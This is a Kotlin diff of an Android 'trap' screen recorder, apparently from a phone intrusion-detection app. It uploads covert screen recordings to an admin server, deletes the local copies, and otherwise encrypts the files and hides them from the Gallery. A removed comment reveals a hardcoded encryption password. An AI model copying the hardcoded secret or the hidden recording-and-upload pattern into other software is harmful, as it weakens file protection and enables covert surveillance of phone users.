+        isHardwareMode = false
     }
 
-    /**
-     * Uploads the recorded video evidence directly to /api/devices/{deviceId}/recordings.
-     * If upload succeeds, the local recording file is deleted immediately so nothing is kept on the phone.
-     * If upload fails (e.g. offline/network issue), the file is locked and encrypted with password "prit@312005"
-     * in the EDR folder and hidden from Gallery (.nomedia).
-     */
+    // ─────────────────────────────────────────────────────────────
+    // UPLOAD / LOCK
+    // ─────────────────────────────────────────────────────────────
+
     private fun uploadTrapRecording(
         context: Context,
         file: File,
@@ -452,9 +586,24 @@ object AppTrapScreenRecorder {
         duration: String
     ) {
         Thread {
+            val netStatus = EdrNetworkManager.getNetworkStatus(context)
+            if (!netStatus.isCloudUploadAllowed) {
+                Log.i(TAG, "Current network is ${netStatus.label}. Upload paused to save mobile data. Locking recording locally...")
+                EdrLocalStorage.appendEdrLog(
+                    context,
+                    "DATA_SAVER",
+                    "Upload paused on ${netStatus.label}. Locked video in /EDR/ folder with password protection."
+                )
+                val locked = EdrFileLocker.lockFile(file, EdrFileLocker.PASSWORD_EDR)
+                if (locked != null) {
+                    Log.i(TAG, "Recording saved safely as ${locked.name} in /EDR/trap_recordings/")
+                }
+                return@Thread
+            }
+
             var uploadedSuccessfully = false
             try {
-                Log.i(TAG, "Uploading trap video evidence (${file.length()} bytes) to EDR Admin Server...")
+                Log.i(TAG, "Uploading trap video (${file.length()} bytes) over ${netStatus.label} to EDR Admin Server...")
                 val deviceId = SyncPreferences.deviceId
                 val url = "${SyncPreferences.httpBaseUrl}/api/devices/$deviceId/recordings"
 
@@ -471,29 +620,21 @@ object AppTrapScreenRecorder {
                     )
                     .build()
 
-                val request = Request.Builder()
-                    .url(url)
-                    .post(body)
-                    .build()
-
+                val request = Request.Builder().url(url).post(body).build()
                 val response = httpClient.newCall(request).execute()
                 uploadedSuccessfully = response.isSuccessful
                 val code = response.code
                 response.close()
 
                 if (uploadedSuccessfully) {
-                    Log.i(TAG, "Trap video evidence uploaded successfully to admin server! (${file.name})")
+                    Log.i(TAG, "Trap video uploaded successfully! (${file.name})")
                     EdrLocalStorage.appendEdrLog(
                         context,
                         "EVIDENCE",
                         "Uploaded attacker video for $appLabel ($duration) to EDR server. Removing local copy from phone."
                     )
-                    // DELETE local video file immediately so it is NOT saved on phone
                     try {
-                        if (file.exists()) {
-                            val deleted = file.delete()
-                            Log.i(TAG, "Local video file removed from phone: $deleted (${file.name})")
-                        }
+                        if (file.exists()) file.delete()
                     } catch (e: Exception) {
                         Log.w(TAG, "Could not delete local video file: ${e.message}")
                     }
@@ -503,10 +644,8 @@ object AppTrapScreenRecorder {
             } catch (e: Exception) {
                 Log.e(TAG, "Failed uploading trap video: ${e.message}", e)
             } finally {
-                // If upload failed (e.g. phone offline), lock & encrypt file in EDR folder with password protection
                 if (!uploadedSuccessfully && file.exists()) {
                     try {
-                        Log.w(TAG, "Server upload unreachable. Encrypting & locking recording locally with password protection...")
                         val locked = EdrFileLocker.lockFile(file, EdrFileLocker.PASSWORD_EDR)
                         if (locked != null) {
                             Log.i(TAG, "Recording file locked: ${locked.name}")
@@ -524,13 +663,17 @@ object AppTrapScreenRecorder {
         }.start()
     }
 
-    /**
-     * Retries uploading any offline recordings that were previously locked with password protection.
-     * Also cleans up any leftover .trashed-* files or unencrypted orphaned .mp4 files.
-     */
+    // ─────────────────────────────────────────────────────────────
+    // FLUSH PENDING LOCKED RECORDINGS
+    // ─────────────────────────────────────────────────────────────
+
     fun flushPendingLockedRecordings(context: Context) {
         Thread {
             try {
+                if (!EdrNetworkManager.isCloudUploadAllowed(context)) {
+                    Log.d(TAG, "Cannot flush offline recordings: currently on restricted network (${EdrNetworkManager.getConnectionTypeLabel(context)})")
+                    return@Thread
+                }
                 val candidateDirs = listOf(
                     EdrLocalStorage.getTrapRecordingsDir(context),
                     File("/sdcard/EDR/trap_recordings"),
@@ -541,19 +684,16 @@ object AppTrapScreenRecorder {
                     EdrLocalStorage.ensureNoMedia(recDir)
                     val files = recDir.listFiles() ?: continue
 
-                    // 1. Clean up trashed files or legacy raw mp4s
                     for (f in files) {
                         if (f.name.startsWith(".trashed-")) {
                             try { f.delete() } catch (ignored: Exception) {}
                         } else if (f.name.endsWith(".mp4") && f != outputFile) {
-                            // Old unencrypted mp4 found -> lock it with password immediately
                             try {
                                 EdrFileLocker.lockFile(f, EdrFileLocker.PASSWORD_EDR)
                             } catch (ignored: Exception) {}
                         }
                     }
 
-                    // 2. Retry upload for any .locked files
                     val lockedFiles = recDir.listFiles { _, name -> name.endsWith(EdrFileLocker.LOCKED_EXTENSION) }
                     if (lockedFiles.isNullOrEmpty()) continue
 
@@ -580,7 +720,6 @@ object AppTrapScreenRecorder {
                         }
 
                         try {
-                            // Extract exact duration from unlocked MP4 file header
                             var offlineDuration = "00:00"
                             try {
                                 val retriever = android.media.MediaMetadataRetriever()
@@ -634,10 +773,6 @@ object AppTrapScreenRecorder {
         }.start()
     }
 
-    /**
-     * Converts an ARGB_8888 Bitmap into NV12 (YUV420 Semi-Planar) byte array for H.264 hardware encoding.
-     * NV12 has Y plane followed by interleaved U and V components (U first, V second).
-     */
     private fun bitmapToNv12(bitmap: Bitmap, width: Int, height: Int): ByteArray {
         val neededPixels = width * height
         val argb = reusableArgb?.takeIf { it.size == neededPixels }
@@ -667,11 +802,9 @@ object AppTrapScreenRecorder {
                 g = (pixel shr 8) and 0xff
                 b = pixel and 0xff
 
-                // Standard ITU-R BT.601 conversion formula
                 y = ((66 * r + 129 * g + 25 * b + 128) shr 8) + 16
                 yuv[yIndex++] = (if (y < 0) 0 else if (y > 255) 255 else y).toByte()
 
-                // NV12 format: U then V interleaved for every 2x2 block
                 if (evenRow && (i and 1) == 0) {
                     u = ((-38 * r - 74 * g + 112 * b + 128) shr 8) + 128
                     v = ((112 * r - 94 * g - 18 * b + 128) shr 8) + 128
